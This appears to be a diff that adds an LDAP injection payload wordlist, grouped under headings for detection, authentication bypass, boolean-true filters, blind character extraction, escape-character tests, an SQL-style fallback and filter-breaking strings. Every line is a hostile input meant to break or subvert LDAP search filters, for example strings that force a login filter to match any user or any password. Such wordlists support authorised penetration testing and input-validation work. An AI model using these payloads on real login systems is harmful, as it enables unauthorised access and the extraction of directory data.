@@ -1,0 +1,38 @@
+# === Detection ===
+*
+(
+)
+\
+*)(
+*))%00
+
+# === Auth bypass — basic ===
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+admin)(&(password=*))
+admin)(!(&(1=0)))
+*)(|(objectclass=*))
+
+# === Boolean truthy ===
+*)(|(cn=*))
+*)(|(uid=*))
+*))(|(cn=*
+
+# === Blind — character extraction ===
+*)(uid=a*))(|(uid=*
+*)(uid=ab*))(|(uid=*
+admin*
+
+# === RFC special chars (escape testing) ===
+\28
+\29
+\5c
+\2a
+
+# === SQL-style fallback (gdy backend miesza) ===
+admin')-- -
+
+# === Filter break ===
+)(cn=))\x00
+)(|(password=*))
+*)(uid=*
